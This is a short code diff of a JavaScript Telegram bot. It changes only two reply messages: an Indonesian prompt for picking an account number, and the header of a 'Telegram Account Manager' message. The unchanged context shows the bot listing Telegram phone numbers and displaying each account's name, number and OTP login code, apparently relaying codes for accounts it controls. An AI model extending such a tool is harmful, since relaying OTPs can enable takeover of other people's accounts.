@@ -174,7 +174,7 @@ function startBot(token) {
               console.log("📄 Sending numbers to user:", numbers);
   
               if (numbers.length > 0) {
-                  ctx.reply('*Pilih Nomor Akun Telegram:*', {
+                  ctx.reply('*Pilih Nomor Dibawah Ini Boss:*', {
                       parse_mode: 'Markdown',
                       ...Markup.inlineKeyboard(numbers)
                   });
@@ -282,7 +282,7 @@ function startBot(token) {
           const info = userInfoRes.data?.userInfo || {};
 
                 await ctx.reply(
-        `*𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖠𝖼𝖼𝗈𝗎𝗇𝗍 𝖬𝖺𝗇𝖺𝗀𝖾𝗋*\n` +
+        `*»»»𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖠𝖼𝖼𝗈𝗎𝗇𝗍 𝖬𝖺𝗇𝖺𝗀𝖾𝗋»»»*\n` +
         `• Nama: ${info.firstName || '-'} ${info.lastName || ''}\n` +
         `• Nomor: ${phoneNumberLink}\n` +
         `• OTP: ${otpCode}\n` +
